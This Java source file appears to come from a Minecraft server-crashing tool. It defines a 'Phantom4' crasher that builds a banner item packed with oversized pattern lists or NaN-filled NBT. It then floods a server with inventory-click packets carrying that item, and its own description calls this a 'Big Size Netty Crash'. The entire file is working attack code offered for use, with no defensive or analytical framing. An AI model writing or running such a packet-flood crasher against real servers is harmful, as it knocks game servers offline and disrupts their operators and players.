
package us.whitedev.crashers.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Optional;
import java.util.Random;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class Phantom4 implements Crasher {
    private static final String METHOD_NAME = "Phantom4";
    private boolean enabled = false;

    public Phantom4() {
    }

    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        String type = args[4].toLowerCase(Locale.ROOT);
        this.setEnabled(true);
        msgHelper.sendMessage("Starting crashing with &f" + this.getName(), true);
        ItemStack itemStack = this.getBannerStack(size, type);

        for(int i = 0; i < packets; ++i) {
            PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, itemStack, new Int2ObjectOpenHashMap()));
        }

        this.setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    private ItemStack getBannerStack(int size, String propType) {
        CompoundTag rootTag = new CompoundTag();
        if (propType.equals("normal")) {
            CompoundTag blockEntityTag = this.getLegitBanner(size);
            rootTag.put("BlockEntityTag", blockEntityTag);
        } else {
            for(int i = 0; i < size; ++i) {
                rootTag.putDouble(String.valueOf(i), Double.NaN);
            }
        }

        return new ItemStack(Items.BLUE_BANNER, 1, Optional.of(rootTag));
    }

    private CompoundTag getLegitBanner(int size) {
        CompoundTag blockEntityTag = new CompoundTag();
        ListTag patterns = new ListTag();
        Random random = new Random();

        for(int i = 0; i < size; ++i) {
            CompoundTag pattern = new CompoundTag();
            pattern.putString("Pattern", "sku");
            pattern.putInt("Color", random.nextInt(1, 13));
            patterns.add(pattern);
        }

        blockEntityTag.put("Patterns", patterns);
        blockEntityTag.putString("id", "banner");
        return blockEntityTag;
    }

    public String getName() {
        return "Phantom4";
    }

    public boolean getEnabled() {
        return this.enabled;
    }

    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    public List<OptionUtil> getOptions() {
        return List.of(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Size", OptionType.INTEGER), new OptionUtil("Type", OptionType.LIST, new String[]{"Normal", "Overload"}));
    }

    public String getArgsUsage() {
        return "packets[100], size[1000], type[Normal]";
    }

    public String getDescription() {
        return "Big Size Netty Crash";
    }
}
